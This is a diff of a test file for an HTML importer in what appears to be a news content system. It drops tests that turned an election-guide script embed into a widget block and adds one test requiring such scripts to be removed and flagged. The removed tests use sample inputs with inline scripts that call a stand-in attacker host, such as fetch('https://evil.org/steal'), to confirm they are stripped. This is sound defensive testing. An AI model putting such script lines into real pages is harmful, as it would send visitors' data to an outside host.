@@ -182,78 +182,14 @@ describe('pictures and frames inside text', () => {
   })
 })
 
-describe('script widgets (the election-guide pattern)', () => {
-  // The shape in Grove's real data: the event script is inside the container, the module script follows it.
-  const real =
-    '<div id="electup-embed" data-embed="36c12ca5-de84-4c35-979e-53f4f81c4d2e">\n  <script>window.dispatchEvent(new Event(\'electup_load\'));</script>\n</div>\n' +
-    '<script type="module" src="https://static.electup.com/v2/app.js"></script>'
-  it('converts the pattern as it really appears', () => {
-    const { nodes, ctx } = run(real)
-    expect(nodes).toHaveLength(1)
-    expect(nodes[0]!.fields).toMatchObject({
-      blockType: 'widget',
-      scriptUrl: 'https://static.electup.com/v2/app.js',
-      module: true,
-      elementId: 'electup-embed',
-      initEvent: 'electup_load',
-      attributes: [{ name: 'data-embed', value: '36c12ca5-de84-4c35-979e-53f4f81c4d2e' }],
-    })
-    expect(ctx.entries).toEqual([{ level: 'noted', code: 'widget.script-embedded', detail: 'static.electup.com' }])
-  })
-  it('a different script inside the container is not a widget', () => {
-    const { nodes, ctx } = run('<div id="g" data-a="1"><script>fetch("https://evil.org/x")</script></div><script src="https://x.org/m.js"></script>')
-    expect(JSON.stringify(nodes)).not.toContain('"widget"')
-    expect(codes(ctx)).toEqual(['html.script-removed', 'html.script-removed'])
-  })
-  const guide =
-    '<div id="electup-guide" data-election-id="2026-general" data-county="escambia"></div>' +
-    '<script>window.dispatchEvent(new Event("electupReady"));</script>' +
-    '<script src="https://cdn.electup.org/guide.js"></script>'
-
-  it('becomes one widget block carrying the container, its settings, the event and the script', () => {
-    const { nodes, ctx } = run(`<p>Before.</p>${guide}<p>After.</p>`)
-    expect(nodes.map((n) => n.type)).toEqual(['paragraph', 'block', 'paragraph'])
-    expect(nodes[1]!.fields).toMatchObject({
-      blockType: 'widget',
-      scriptUrl: 'https://cdn.electup.org/guide.js',
-      elementId: 'electup-guide',
-      initEvent: 'electupReady',
-      height: 600,
-      title: 'Interactive content from cdn.electup.org',
-      attributes: [{ name: 'data-election-id', value: '2026-general' }, { name: 'data-county', value: 'escambia' }],
-    })
-    // the script is not dropped silently and not imported: it is carried as a block and the report notes the host
-    expect(ctx.entries).toEqual([{ level: 'noted', code: 'widget.script-embedded', detail: 'cdn.electup.org' }])
-    expect(JSON.stringify(nodes)).not.toContain('dispatchEvent')
-  })
-  it('works without the one-line event script, and keeps a module script a module', () => {
-    const { nodes } = run('<div id="g" data-a="1"></div>\n<script type="module" src="https://x.org/m.js"></script>')
-    expect(nodes).toHaveLength(1)
-    expect(nodes[0]!.fields).toMatchObject({ blockType: 'widget', module: true })
-    expect((nodes[0]!.fields as Record<string, unknown>).initEvent).toBeUndefined()
-  })
-  it('builds the same ids every time', () => {
-    expect(JSON.stringify(run(guide).nodes)).toBe(JSON.stringify(run(guide).nodes))
-  })
-  it('leaves any other inline script removed and flagged, and makes no widget of it', () => {
-    const { nodes, ctx } = run('<div id="g" data-a="1"></div><script>fetch("https://evil.org/steal")</script><script src="https://x.org/m.js"></script>')
-    expect(nodes.some((n) => n.type === 'block' && (n.fields as { blockType?: string }).blockType === 'widget')).toBe(false)
-    expect(JSON.stringify(nodes)).not.toContain('evil.org')
-    expect(codes(ctx)).toEqual(['html.script-removed', 'html.script-removed'])
-  })
-  it('a lone script, or a container with no script after it, is not a widget', () => {
-    expect(codes(run('<script src="https://x.org/m.js"></script>').ctx)).toEqual(['html.script-removed'])
-    expect(run('<div id="g" data-a="1"></div><p>Text</p>').nodes.map((n) => n.type)).toEqual(['paragraph'])
-  })
-  it('refuses a script that is not https or is on a private address', () => {
-    for (const src of ['http://x.org/m.js', 'https://10.0.0.5/m.js', 'https://www.wuwf.org/m.js']) {
-      const { nodes, ctx } = run(`<div id="g" data-a="1"></div><script src="${src}"></script>`)
-      expect(JSON.stringify(nodes)).not.toContain('"widget"')
-      expect(codes(ctx)).toContain('html.script-removed')
-    }
-  })
-  it('a container that holds content is left alone', () => {
-    const { nodes } = run('<div id="g" data-a="1"><p>Hello</p></div><script src="https://x.org/m.js"></script>')
-    expect(JSON.stringify(nodes)).not.toContain('"widget"')
+describe('a script widget pasted into a story (the 2026 voter guide)', () => {
+  it('is not imported: the script is removed, flagged for review, and the story text around it is kept', () => {
+    const { nodes, ctx } = run(
+      '<p>Before.</p><div id="electup-embed" data-embed="36c12ca5"><script>window.dispatchEvent(new Event(\'electup_load\'));</script></div>' +
+        '<script type="module" src="https://static.electup.com/v2/app.js"></script><p>After.</p>',
+    )
+    expect(nodes.map(texts)).toEqual(['Before.', 'After.'])
+    expect(JSON.stringify(nodes)).not.toMatch(/electup|dispatchEvent/)
+    expect(ctx.entries.map((e) => [e.level, e.code])).toEqual([['preserved', 'html.script-removed'], ['preserved', 'html.script-removed']])
   })
 })
